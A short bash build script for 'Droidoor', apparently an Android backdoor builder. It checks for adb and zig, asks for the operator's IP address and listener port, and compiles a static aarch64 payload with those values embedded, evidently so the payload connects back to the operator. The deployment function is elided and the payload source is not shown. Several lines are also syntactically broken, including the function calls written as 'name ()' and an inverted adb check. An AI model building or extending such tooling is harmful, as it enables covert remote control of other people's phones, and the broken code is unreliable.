#!/usr/bin/env bash

set -euo pipefail

# Constants
TARGET_ARCH="aarch64-linux-musl"
OUT_BIN="./bin/droidoor"
CXX="zig c++"

# Colored output
RED="\033[0;31m"
GREEN="\033[0;32m"
BLUE="\033[0;34m"
NC="\033[0m"
info () { echo -e "${BLUE}[ * ]${NC} $1"; }
success () { echo -e "${GREEN}[ + ]${NC} $1"; }
error () { echo -e "${RED}[ - ]${NC} $1"; exit 1; }

# -------------- #

check_requirements() {
    local tools=("adb" "zig")
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            error "Dependency '$tool' not found. Please install it before using Droidoor."
            exit 1
        fi
    done
}


check_adb() {
    local status=$(adb get-state 2>/dev/null)
    if [ "$status" == "device" ]; then
        return 1
    else
        return 0
    fi
}


build_payload () {
    info "Build payload... Target architecture: $TARGET_ARCH"
    mkdir -p bin
    
    # Compilation
    $CXX -target $TARGET_ARCH -static -O3 \
         src/payload/*.cpp \
         -I. \
         $DEFINES \
         -o $OUT_BIN -lpthread
         
    if [ $? -eq 0 ]; then
        success "Successfully built payload: $OUT_BIN"
    else
        error "Compilation error !"
        exit 1
    fi
}

deploy_payload () {
    ...
}

main () {
    echo "DROIDOOR version 1.0.0"

    check_requirements ()

    read -p "Enter your IP address: " USER_IP
    read -p "Enter your listener port: " USER_PORT
    
    DEFINES="-DTARGET_IP=\"$USER_IP\" -DTARGET_PORT=$USER_PORT"

    build_payload ()


}